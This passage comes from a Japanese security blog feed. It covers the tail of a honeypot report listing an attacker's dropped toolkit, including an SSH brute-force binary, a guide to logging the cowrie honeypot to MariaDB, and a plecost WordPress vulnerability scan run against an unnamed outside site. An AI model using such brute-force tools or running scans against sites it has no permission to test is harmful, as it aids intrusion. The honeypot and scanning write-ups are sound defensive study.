class="line">-rwxr-xr-x <span class="number">1</span> <span class="number">561</span> <span class="number">561</span> <span class="number">2612509</span> <span class="number">12</span>月 <span class="number">20</span>  <span class="number">2013</span> ssh2</span><br></pre></td></tr></table></figure>
<p>それぞれのファイルタイプはこんな感じ。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mass:   ASCII <span class="keyword">text</span></span><br><span class="line">pscan:  ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, <span class="built_in">version</span> <span class="number">1</span> (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.9</span>, <span class="operator">not</span> stripped</span><br><span class="line"><span class="built_in">random</span>: Bourne-Again <span class="built_in">shell</span> script, ASCII <span class="keyword">text</span> executable</span><br><span class="line">scan:   Bourne-Again <span class="built_in">shell</span> script, ASCII <span class="keyword">text</span> executable</span><br><span class="line">screen: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, <span class="built_in">version</span> <span class="number">1</span> (SYSV), dynamically linked (uses shared libs), <span class="keyword">for</span> GNU/Linux <span class="number">2.2</span><span class="number">.5</span>, stripped</span><br><span class="line">ssh2:   ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, <span class="built_in">version</span> <span class="number">1</span> (SYSV), statically linked, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.9</span>, <span class="operator">not</span> stripped</span><br></pre></td></tr></table></figure>
<p>ssh2の中身を<code>strings</code>で見たところ、ssh2のブルートフォースアタックツールのようだった。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">1</span>;<span class="number">37</span>m@SSH2 Bruteforce v2<span class="number">.2</span> @ <span class="number">2014</span>!</span><br><span class="line">[<span class="number">1</span>;<span class="number">37</span>m-&gt; by</span><br><span class="line">[<span class="number">01</span>;<span class="number">33</span>mlan.tester@yahoo.com</span><br><span class="line">[<span class="number">1</span>;<span class="number">37</span>m-&gt; E-mail us <span class="keyword">for</span> support or <span class="keyword">if</span> you want to make a donation !</span><br></pre></td></tr></table></figure>
]]></content>
    <summary type="html">
    <![CDATA[<p>アメリカ合衆国(US)から不正アクセスを観測したのでご紹介。</p>
<p>今回も、動画を見ていただこう。</p>]]>
    
    </summary>
    
      <category term="cowrie" scheme="http://atani.github.io/tags/cowrie/"/>
    
      <category term="honeypot" scheme="http://atani.github.io/tags/honeypot/"/>
    
      <category term="security" scheme="http://atani.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ハニーポットcowrieのログを、mariaDBで管理しよう。]]></title>
    <link href="http://atani.github.io/2015/07/%E3%83%8F%E3%83%8B%E3%83%BC%E3%83%9D%E3%83%83%E3%83%88cowrie%E3%81%AE%E3%83%AD%E3%82%B0%E3%82%92%E3%80%81mariaDB%E3%81%A7%E7%AE%A1%E7%90%86%E3%81%97%E3%82%88%E3%81%86%E3%80%82/"/>
    <id>http://atani.github.io/2015/07/ハニーポットcowrieのログを、mariaDBで管理しよう。/</id>
    <published>2015-07-22T14:00:26.000Z</published>
    <updated>2015-07-22T13:33:19.000Z</updated>
    <content type="html"><![CDATA[<p>前回、<a href="http://atani.github.io/2015/07/CentOS7にKippoをインストールする/">構築手順を書いたkippo</a>。<br>ログをMySQL(mariaDB)で管理したいと思い、kippoで設定を試みるも、以下エラーが出て、途方にくれていた。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2015</span>-<span class="number">07</span>-<span class="number">21</span> <span class="number">00</span>:<span class="number">41</span>:<span class="number">42</span>+<span class="number">0900</span> [-] Unable <span class="built_in">to</span> <span class="built_in">format</span> event &#123;<span class="string">'log_namespace'</span>: <span class="string">'twisted.logger._global'</span>, <span class="string">'log_level'</span>: &lt;LogLevel=warn&gt;, <span class="string">'fileNow'</span>: <span class="string">'/usr/lib64/python2.7/site-packages/twisted/python/log.py'</span>, <span class="string">'format'</span>: <span class="string">'%(log_legacy)s'</span>, <span class="string">'lineNow'</span>: <span class="number">210</span>, <span class="string">'fileThen'</span>: <span class="string">'/usr/lib64/python2.7/site-packages/twisted/python/log.py'</span>, <span class="string">'log_source'</span>: None, <span class="string">'system'</span>: <span class="string">'-'</span>, <span class="string">'lineThen'</span>: <span class="number">210</span>, <span class="string">'log_logger'</span>: &lt;Logger <span class="string">'twisted.logger._global'</span>&gt;, <span class="string">'time'</span>: <span class="number">1437406902.593759</span>, <span class="string">'log_format'</span>: <span class="string">'Warning: primary log target selected twice at &lt;&#123;fileNow&#125;:&#123;lineNow&#125;&gt; - previously selected at &lt;&#123;fileThen:logThen&#125;&gt;.  Remove one of the calls to beginLoggingTo.'</span>, <span class="string">'message'</span>: (), <span class="string">'log_time'</span>: <span class="number">1437406902.593759</span>&#125;: Invalid conversion specification</span><br></pre></td></tr></table></figure>
<p>調べてみると、Twistedのインターフェースが変わったようで、MySQL(mariaDB)にデータが入らなかった。</p>
<p>そこで、kippoをベースに作られた <code>cowrie</code>(タカラガイ) を発見。<br>こちらを利用することにした。</p>
<p>cowrieでは、先ほどの問題は解消していた。<br><a href="https://github.com/micheloosterhof/cowrie/issues/8" target="_blank" rel="external">Logging issue with Twisted 15</a></p>
<a id="more"></a>
<p>必要モジュールはkippoと同じなので割愛する。<br><a href="http://atani.github.io/2015/07/CentOS7にKippoをインストールする/">こちら</a>を参照されたし。</p>
<h2 id="mariaDB_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB"><a href="#mariaDB_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB" class="headerlink" title="mariaDBをインストール"></a>mariaDBをインストール</h2><p>mariaDBをインストールする。</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="label">yum</span> -y install <span class="keyword">mariadb-server </span><span class="keyword">mariadb-libs </span><span class="keyword">mariadb</span></span><br></pre></td></tr></table></figure>
<p>madiaDBを起動する。</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="literal">start</span> mariadb.service</span><br></pre></td></tr></table></figure>
<p>mariaDBを自動起動するように設定する。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> mariadb.service</span><br></pre></td></tr></table></figure>
<p>cowrieのログをmariaDBに入れるためデータベースを作成し、ログイン権限を設定する。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br><span class="line"><span class="operator"><span class="keyword">use</span> mysql</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'cowrie'</span>@<span class="string">'localhost'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'your password'</span>;</span></span><br><span class="line"><span class="operator"><span class="keyword">GRANT</span> ALL <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">TO</span> cowrie@localhost <span class="keyword">IDENTIFIED</span> <span class="keyword">BY</span> <span class="string">'your password'</span>;</span></span><br><span class="line"><span class="operator"><span class="keyword">create</span> <span class="keyword">database</span> cowrie;</span></span><br></pre></td></tr></table></figure>
<p>mariaDBの設定はこれでおしまい。</p>
<p>次にcowrieを使えるようにしていく。<br>必要パッケージをインストールする。</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="keyword">install</span> MySQL-python</span><br></pre></td></tr></table></figure>
<p>cowrieを使えるようにする。<code>root</code>ユーザー以外で作業をしよう。</p>
<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/micheloosterhof/cowrie.git</span><br><span class="line">cd cowrie</span><br></pre></td></tr></table></figure>
<p><code>cowrie.cfg</code> を修正。最小限の項目について説明する。</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="setting">listen_port = <span class="value"><span class="number">22222</span> ## 好きなポートを指定する。デフォルトは<span class="number">2222</span></span></span></span><br><span class="line"><span class="title"></span><br><span class="line">[database_mysql]</span>  <span class="comment">## データベースの接続設定を行う。</span></span><br><span class="line"><span class="setting">host = <span class="value">localhost</span></span></span><br><span class="line"><span class="setting">database = <span class="value">cowrie</span></span></span><br><span class="line"><span class="setting">username = <span class="value">cowrie</span></span></span><br><span class="line"><span class="setting">password = <span class="value">cowrie</span></span></span><br><span class="line"><span class="setting">port = <span class="value"><span class="number">3306</span></span></span></span><br></pre></td></tr></table></figure>
<p>cowrieで使うテーブルを、先ほど作成したデータベース<code>cowrie</code>の中に作成していく。<code>cowrie/doc/sql</code>の中にsqlファイルがあるので、こちらを使う。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> cowrie/doc/sql</span><br><span class="line"><span class="keyword">cat</span> mysql.sql | mysql -<span class="keyword">u</span> cowrie  -p cowrie</span><br><span class="line"><span class="keyword">cat</span> <span class="keyword">update</span>*.sql | mysql -<span class="keyword">u</span> cowrie  -p cowrie</span><br></pre></td></tr></table></figure>
<p>mariadbにログインしてテーブルができていることを確認する。</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [cowrie]&gt; show tables;</span><br><span class="line"><span class="code">+------------------+</span></span><br><span class="line"><span class="header">| Tables_in_cowrie |</span><br><span class="line">+------------------+</span></span><br><span class="line">| auth             |</span><br><span class="line">| clients          |</span><br><span class="line">| downloads        |</span><br><span class="line">| input            |</span><br><span class="line">| sensors          |</span><br><span class="line">| sessions         |</span><br><span class="line"><span class="header">| ttylog           |</span><br><span class="line">+------------------+</span></span><br><span class="line">7 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>ここまで出来れば後は、cowrieを起動する。</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sh</span> start.<span class="keyword">sh</span></span><br></pre></td></tr></table></figure>
<p>必要あれば、22ポートのアクセスを、cowrieのlistenしているポートに転送してあげれば、あとは不正アクセスを待つだけ(自身でアクセスしてmariaDBにデータが入っていることを確認しよう)。</p>
<h1 id="u6700_u5F8C_u306B_u3001_u6052_u4F8B_u306E_u89B3_u5BDF_u65E5_u8A18"><a href="#u6700_u5F8C_u306B_u3001_u6052_u4F8B_u306E_u89B3_u5BDF_u65E5_u8A18" class="headerlink" title="最後に、恒例の観察日記"></a>最後に、恒例の観察日記</h1><p>クラッカーの行動を今回も観察してみよう。<br>サーバを停止しようと試みたが出来ず、rebootで我慢したようだ。<br>クラッカーのうちの多くは動画のように愉快犯である。</p>
<img src="/2015/07/ハニーポットcowrieのログを、mariaDBで管理しよう。/kippo_log.gif" alt="[kippo_log.gif]" title="[kippo_log.gif]">
<hr>
<h2 id="u53C2_u8003"><a href="#u53C2_u8003" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://github.com/micheloosterhof/cowrie" target="_blank" rel="external">cowrie</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>前回、<a href="http://atani.github.io/2015/07/CentOS7にKippoをインストールする/">構築手順を書いたkippo</a>。<br>ログをMySQL(mariaDB)で管理したいと思い、kippoで設定を試みるも、以下エラーが出て、途方にくれていた。</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2015</span>-<span class="number">07</span>-<span class="number">21</span> <span class="number">00</span>:<span class="number">41</span>:<span class="number">42</span>+<span class="number">0900</span> [-] Unable <span class="built_in">to</span> <span class="built_in">format</span> event &#123;<span class="string">'log_namespace'</span>: <span class="string">'twisted.logger._global'</span>, <span class="string">'log_level'</span>: &lt;LogLevel=warn&gt;, <span class="string">'fileNow'</span>: <span class="string">'/usr/lib64/python2.7/site-packages/twisted/python/log.py'</span>, <span class="string">'format'</span>: <span class="string">'%(log_legacy)s'</span>, <span class="string">'lineNow'</span>: <span class="number">210</span>, <span class="string">'fileThen'</span>: <span class="string">'/usr/lib64/python2.7/site-packages/twisted/python/log.py'</span>, <span class="string">'log_source'</span>: None, <span class="string">'system'</span>: <span class="string">'-'</span>, <span class="string">'lineThen'</span>: <span class="number">210</span>, <span class="string">'log_logger'</span>: &lt;Logger <span class="string">'twisted.logger._global'</span>&gt;, <span class="string">'time'</span>: <span class="number">1437406902.593759</span>, <span class="string">'log_format'</span>: <span class="string">'Warning: primary log target selected twice at &lt;&#123;fileNow&#125;:&#123;lineNow&#125;&gt; - previously selected at &lt;&#123;fileThen:logThen&#125;&gt;.  Remove one of the calls to beginLoggingTo.'</span>, <span class="string">'message'</span>: (), <span class="string">'log_time'</span>: <span class="number">1437406902.593759</span>&#125;: Invalid conversion specification</span><br></pre></td></tr></table></figure>
<p>調べてみると、Twistedのインターフェースが変わったようで、MySQL(mariaDB)にデータが入らなかった。</p>
<p>そこで、kippoをベースに作られた <code>cowrie</code>(タカラガイ) を発見。<br>こちらを利用することにした。</p>
<p>cowrieでは、先ほどの問題は解消していた。<br><a href="https://github.com/micheloosterhof/cowrie/issues/8">Logging issue with Twisted 15</a></p>]]>
    
    </summary>
    
      <category term="centos7" scheme="http://atani.github.io/tags/centos7/"/>
    
      <category term="honeypot" scheme="http://atani.github.io/tags/honeypot/"/>
    
      <category term="secutiry" scheme="http://atani.github.io/tags/secutiry/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[wordpress利用サイトのセキュリティ診断書を作成するPart2]]></title>
    <link href="http://atani.github.io/2015/07/wordpress%E5%88%A9%E7%94%A8%E3%82%B5%E3%82%A4%E3%83%88%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E8%A8%BA%E6%96%AD%E6%9B%B8%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8BPart2/"/>
    <id>http://atani.github.io/2015/07/wordpress利用サイトのセキュリティ診断書を作成するPart2/</id>
    <published>2015-07-15T15:02:35.000Z</published>
    <updated>2015-07-15T15:08:33.000Z</updated>
    <content type="html"><![CDATA[<p><a href="http://atani.github.io/2015/04/wordpress利用サイトのセキュリティ診断書を作成する/">wordpress利用サイトのセキュリティ診断書を作成する</a>では、<br><code>wpscan</code> を紹介した。今回は、<code>plecost3</code> をご紹介。</p>
<p>plecost3 を動かすにはpython3で必要なので、簡単にpython3のインストール手順からご紹介する。</p>
<h2 id="python3_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB"><a href="#python3_u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB" class="headerlink" title="python3をインストール"></a>python3をインストール</h2><p>リポジトリを登録</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -<span class="constant">Uvh</span> <span class="symbol">https:</span>/<span class="regexp">/www.softwarecollections.org/en</span><span class="regexp">/scls/rhscl</span><span class="regexp">/python33/epel</span>-<span class="number">7</span>-x86_64/download/rhscl-python33-epel-<span class="number">7</span>-x86_64.noarch.rpm</span><br></pre></td></tr></table></figure>
<p>python3 をインストール</p>
<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y <span class="keyword">install</span> python33</span><br></pre></td></tr></table></figure>
<p>scl(Software Collections)でpython3を利用するように設定。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scl <span class="built_in">enable</span> python33 bash</span><br></pre></td></tr></table></figure>
<p>pip をインストール</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">easy_install</span> pip</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<h2 id="plecost__u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB"><a href="#plecost__u3092_u30A4_u30F3_u30B9_u30C8_u30FC_u30EB" class="headerlink" title="plecost をインストール"></a>plecost をインストール</h2><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip <span class="keyword">install</span> plecost</span><br></pre></td></tr></table></figure>
<p>チェックするプラグインリストを最新にする。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plecost <span class="comment">--update-plugins</span></span><br></pre></td></tr></table></figure>
<p>実行結果</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ plecost --update-plugins</span><br><span class="line"></span><br><span class="line">(省略)</span><br><span class="line">To get rid <span class="keyword">of</span> <span class="keyword">this</span> warning, change <span class="attribute">this</span>:</span><br><span class="line"></span><br><span class="line"> BeautifulSoup([your markup])</span><br><span class="line"></span><br><span class="line">to <span class="attribute">this</span>:</span><br><span class="line"></span><br><span class="line"> BeautifulSoup([your markup], <span class="string">"html.parser"</span>)</span><br><span class="line"></span><br><span class="line">  markup_type=markup_type))</span><br><span class="line">[*] Downloading plugins (slow):  [<span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#####] 100.00%</span><br><span class="line">[*] Oks!</span></span><br></pre></td></tr></table></figure>
<p>脆弱性情報も最新にする。</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plecost <span class="comment">--update-cve</span></span><br></pre></td></tr></table></figure>
<p>実行結果</p>
<figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ plecost --update-cve</span><br><span class="line"></span><br><span class="line">(省略)</span><br><span class="line">[*] Updating CVE database...</span><br><span class="line">    Downloading NVD feed <span class="number">2013</span>:</span><br><span class="line">        Processing <span class="attribute">file</span>:  [<span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#####] 100.00%</span><br><span class="line">    Downloading NVD feed 2014:</span><br><span class="line">        Processing file:  [###</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">##] 100.00%</span></span><br><span class="line">    Downloading NVD feed <span class="number">2015</span>:</span><br><span class="line">        Processing <span class="attribute">file</span>:  [<span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">######</span><span class="comment">#####] 100.00%</span><br><span class="line"></span><br><span class="line">[*] Done!</span></span><br></pre></td></tr></table></figure>
<p>以上で、plecostの利用準備は完了。</p>
<h1 id="u4F7F_u3044_u65B9"><a href="#u4F7F_u3044_u65B9" class="headerlink" title="使い方"></a>使い方</h1><p>使い方は簡単 <code>plecost</code> コマンドに WordpressのURLを渡すだけ。</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plecost <span class="string">http:</span><span class="comment">//example.com</span></span><br></pre></td></tr></table></figure>
<h1 id="u4F7F_u3063_u3066_u307F_u3088_u3046"><a href="#u4F7F_u3063_u3066_u307F_u3088_u3046" class="headerlink" title="使ってみよう"></a>使ってみよう</h1><p>某サイトで試してみた。 バージョン3.5.1 とかなり古いバージョンを使っており、脆弱であることが確認できた。さらにCVE情報のリンクもあるので、どんな脆弱性があるのかも確認が可能となっている。</p>
<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># plecost http://example.com</span></span><br><span class="line"></span><br><span class="line">/<span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span><span class="regexp">//</span></span><br><span class="line">/<span class="regexp">/ ..................................DMI...</span><br><span class="line">/</span><span class="regexp">/ .............................:MMMM......</span><br><span class="line">/</span><span class="regexp">/ .........................$MMMMM:........</span><br><span class="line">/</span><span class="regexp">/ .........M.....,M,=NMMMMMMMMD...........</span><br><span class="line">/</span><span class="regexp">/ ........MMN...MMMMMMMMMMMM,.............</span><br><span class="line">/</span><span class="regexp">/ .......MMMMMMMMMMMMMMMMM~...............</span><br><span class="line">/</span><span class="regexp">/ .......MMMMMMMMMMMMMMM..................</span><br><span class="line">/</span><span class="regexp">/ ....?MMMMMMMMMMMMMMMN$I.................</span><br><span class="line">/</span><span class="regexp">/ .?.MMMMMMMMMMMMMMMMMMMMMM...............</span><br><span class="line">/</span><span class="regexp">/ .MMMMMMMMMMMMMMN........................</span><br><span class="line">/</span><span class="regexp">/ 7MMMMMMMMMMMMMON$.......................</span><br><span class="line">/</span><span class="regexp">/ ZMMMMMMMMMMMMMMMMMM.......libs.......</span><br><span class="line">/</span><span class="regexp">/ .:MMMMMMMZ~7MMMMMMMMMO..................</span><br><span class="line">/</span><span class="regexp">/ ....~+:.................................</span><br><span class="line">/</span><span class="regexp">/</span><br><span class="line">/</span><span class="regexp">/ Plecost - Wordpress finger printer Tool - v1.0.0</span><br><span class="line">/</span><span class="regexp">/</span><br><span class="line">/</span><span class="regexp">/ Developed by:</span><br><span class="line">/</span><span class="regexp">/        Francisco Jesus Gomez aka ffranz | @ffranz - ffranz-[at]-iniqua.com</span><br><span class="line">/</span><span class="regexp">/        Daniel Garcia aka cr0hn | @ggdaniel - cr0hn-[at]-cr0hn.com</span><br><span class="line">/</span><span class="regexp">/</span><br><span class="line">/</span><span class="regexp">/ Info: http:/</span><span class="regexp">/iniqua.com/labs</span><span class="regexp">/</span><br><span class="line">/</span><span class="regexp">/ Repo: https:/</span><span class="regexp">/github.com/iniqua</span><span class="regexp">/plecost</span><br><span class="line">/</span><span class="regexp">/ Bug report: libs@iniqua.com or https:/</span><span class="regexp">/github.com/iniqua</span><span class="regexp">/plecost/issues</span><span class="regexp">/</span><br><span class="line"></span><br><span class="line">[*] Testing target connection... ok!</span><br><span class="line">[*] Looking for WordPress installation...</span><br><span class="line">    [#########################################] 100.00%</span><br><span class="line">    ok!</span><br><span class="line">[*] Getting WordPress version... 3.5.1 (latest: 4.2.2)</span><br><span class="line">    |_CVE list:</span><br><span class="line">    |__CVE-2013-2205: (http:/</span><span class="regexp">/cve.mitre.org/cgi</span>-bin/cvename.cgi?name=<span class="constant">CVE</span>-<span class="number">2013</span>-<span class="number">2205</span>)</span><br><span class="line">    |__CVE-<span class="number">2013</span>-<span class="number">2202</span>: (<span class="symbol">http:</span>/<span class="regexp">/cve.mitre.org/cgi</span>-bin/cvename.cgi?name=<span class="constant">CVE</span>-<span class="number">2013</span>-<span class="number">2202</span>)</span><br><span class="line">    |__CVE-<span class="number">2013</span>-<span class="number">2203</span>: (<span class="symbol">http:</span>/<span class="regexp">/cve.mitre.org/cgi</span>-bin/cvename.cgi?name=<span class="constant">CVE</span>-<span class="number">2013</span>-<span class="number">2203</span>)</span><br><span class="line">    |__CVE-<span class="number">2013</span>-<span class="number">2200</span>: (<span class="symbol">http:</span>/<span class="regexp">/cve.mitre.org/cgi</span>-bin/cvename.cgi?name=<span class="constant">CVE</span>-<span class="number">2013</span>-<span class="number">2200</span>)</span><br><span class="line">    |__CVE-<span class="number">2013</span>-<span class="number">2201</span>: (<span class="symbol">http:</span>/<span class="regexp">/cve.mitre.org/cgi</span>-bin/cvename.cgi?name=<span class="constant">CVE</span>-<span class="number">2013</span>-<span class="number">2201</span>)</span><br><span class="line">    |__CVE-<span class="number">2013</span>-<span class="number">2204</span>: (<span class="symbol">http:</span>/<span class="regexp">/cve.mitre.org/cgi</span>-bin/cvename.cgi?name=<span class="constant">CVE</span>-<span class="number">2013</span>-<span class="number">2204</span>)</span><br><span class="line">    |__CVE-<span class="number">2013</span>-<span class="number">2199</span>: (<span class="symbol">http:</span>/<span class="regexp">/cve.mitre.org/cgi</span>-bin/cvename.cgi?name=<span class="constant">CVE</span>-<span class="number">2013</span>-<span class="number">2199</span>)</span><br><span class="line">    |__CVE-<span class="number">2013</span>-<span class="number">2173</span>: (<span class="symbol">http:</span>/<span class="regexp">/cve.mitre.org/cgi</span>-bin/cvename.cgi?name=<span class="constant">CVE</span>-<span class="number">2013</span>-<span class="number">2173</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] <span class="constant">Looking</span> <span class="keyword">for</span> plugins (<span class="symbol">wordlist:</span> plugin_list_50.txt) ...</span><br><span class="line">[*] <span class="constant">Done</span>!</span><br></pre></td></tr></table></figure>
<p>CVEの情報は、以下のオプションで確認することも可能。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plecost -nb --cve CVE-<span class="number">2013</span>-<span class="number">2204</span></span><br></pre></td></tr></table></figure>
<p>実行結果</p>
<figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ plecost -nb <span class="comment">--cve CVE-2013-2204</span></span><br><span class="line"></span><br><span class="line">// Plecost - Wordpress finger printer Tool - v1.<span class="number">0.0</span></span><br><span class="line"></span><br><span class="line">[*] Detail <span class="keyword">for</span> CVE <span class="attribute">'CVE</span>-<span class="number">2013</span>-<span class="number">2204</span>':</span><br><span class="line"></span><br><span class="line">    moxieplayer.as <span class="keyword">in</span> Moxiecode moxieplayer, as used <span class="keyword">in</span> the TinyMCE Media plugin <span class="keyword">in</span> WordPress before <span class="number">3.5</span>.<span class="number">2</span> <span class="keyword">and</span> other products, does <span class="keyword">not</span> consider the presence <span class="keyword">of</span> a # (pound sign) <span class="typename">character</span> during extraction <span class="keyword">of</span> the QUERY_STRING, which allows remote attackers <span class="keyword">to</span> pass arbitrary parameters <span class="keyword">to</span> a Flash application, <span class="keyword">and</span> conduct content-spoofing attacks, via a crafted <span class="typename">string</span> <span class="keyword">after</span> a ? (question mark) <span class="typename">character</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Done!</span><br></pre></td></tr></table></figure>
<p>脆弱性情報を持つプラグインリストは以下のコマンドで知ることが出来る。</p>
